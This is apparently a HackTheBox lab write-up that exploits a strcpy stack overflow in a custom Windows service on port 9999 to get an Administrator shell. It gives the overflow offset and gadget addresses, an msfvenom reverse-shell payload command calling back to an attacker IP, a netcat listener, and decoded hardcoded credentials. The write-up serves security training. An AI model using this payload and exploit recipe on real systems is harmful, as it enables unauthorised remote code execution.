---
title: "Hancliffe"
date: 2026-11-03 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, windows, hard, buffer-overflow, reverse-engineering, hardcoded-credentials, socket-reuse, exploit-dev]
description: "Hancliffe is a Hard Windows box whose intended path threads a reverse-proxy normalization bypass into a Nuxeo template-injection RCE and a chain of credential theft. But a custom service listening on port 9999 — running as Administrator and reachable from the network — has a classic stack buffer overflow, so a socket-reuse exploit gives a privileged shell directly. This post covers recon through the user flag."
image:
    path: /assets/Images/hancliffe-004_exploit_bof-9999.png
---

## Overview

Hancliffe is a Hard Windows machine. Beyond the usual web front-end on port 80, it exposes two unusual services: a stateless password manager on port 8000 and a small custom TCP application ("Brankas") on port 9999. That port-9999 binary runs **as Administrator**, is reachable over the network, and copies attacker input into a fixed stack buffer with `strcpy()` — a textbook stack buffer overflow. Recovering the binary's hard-coded login and then overflowing the saved return address lands a shell that can read the user flag (and everything else on the box).

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 80   | nginx   | Default page; hidden Java app behind the proxy |
| 8000 | HTTP    | "H@$hPa$$" stateless password manager |
| 9999 | custom  | `MyFirstApp.exe` / "Brankas" — auth + "save creds" prompt |

```bash
nmap -p80,8000,9999 -Pn --open -sV 10.129.96.116
```

Port 9999 is the standout — a bespoke binary speaking a line-based protocol (`Username:` → `Password:` → `FullName:` → `Input Your Code:`). Custom network services are prime buffer-overflow territory.

## Enumeration

Pulling the `MyFirstApp.exe` binary and inspecting it reveals two things:

1. A **hard-coded login** stored obfuscated in the binary. The blob `YXlYeDtsbD98eDtsWms5SyU=` decodes through Base64 → ROT47 → Atbash back to `alfiansyah : K3r4j@@nM4j@pAh!T`.
2. A `_SaveCreds()` routine that copies the user-supplied "code" into a **fixed 50-byte stack buffer using `strcpy()`** — no length check. Anything past ~70 bytes overruns the saved return address (EIP).

The binary is compiled without ASLR, so a `jmp esp` gadget sits at a fixed address (`0x719023a8`). The catch: the landing space at ESP is tiny, too small for a full reverse-shell payload.

## Foothold

The fix for the cramped landing space is **socket reuse** — instead of stuffing shellcode into the overflow, the return address jumps into a short stub that calls the program's own `recv()` (at `0x719082ac`) to pull the real shellcode in over the *already-open* connection, into a larger buffer, then executes it.

Generate a null-free Windows reverse-shell payload (the protocol is null-terminated, so `\x00` is a bad char):

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.13 LPORT=4444 EXITFUNC=thread -b "\x00" -f python -v shellcode > sc.py
```

![msfvenom](/assets/Images/hancliffe-001_exploit_msfvenom.png)

Catch the shell with a file-fed listener so commands can be driven into the non-interactive `cmd.exe`:

```bash
: > /tmp/hc_cmds.txt
tail -f /tmp/hc_cmds.txt | nc -lvnp 4444 > shell.log
```

The exploit logs in with the recovered credentials, sends the overflow (offset 66, `jmp esp`, a `\xeb\xb8` short jump back into the socket-reuse stub), then streams the shellcode over the same socket. The login has a ~50/50 race (the app reads the password in a fixed-size chunk and restarts every few minutes), so the exploit simply retries until it sees `Login Successfully!` before firing:

```bash
python3 sploit.py 10.129.96.116 9999
```

![BOF exploit](/assets/Images/hancliffe-004_exploit_bof-9999.png)

The connection lands a shell:

![shell](/assets/Images/hancliffe-002_foothold_shell.png)

```bash
printf 'whoami\n' >> /tmp/hc_cmds.txt
# hancliffe\administrator
```

Because the vulnerable service runs as Administrator, the overflow alone is a privileged shell.

## User flag

```bash
type C:\Users\clara\Desktop\user.txt   # HTB{...}
```

![user flag](/assets/Images/hancliffe-005_foothold_user-flag.png)

The user flag belongs to `clara` and is readable immediately from the shell.

> Foothold complete. Privilege escalation is left as an exercise — this post stops at user.
